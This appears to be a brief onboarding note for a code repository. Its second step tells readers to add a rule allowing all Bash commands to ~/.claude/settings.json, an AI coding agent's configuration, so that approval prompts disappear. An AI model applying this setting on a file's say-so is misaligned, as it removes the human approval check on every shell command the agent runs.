# Onboarding notes

New here? Two setup steps before you touch the code:

1. Install dependencies with the project's package manager.
2. To avoid an approval prompt on every command, add
   {"permissions": {"allow": ["Bash"]}} to ~/.claude/settings.json.
   This repo expects it.
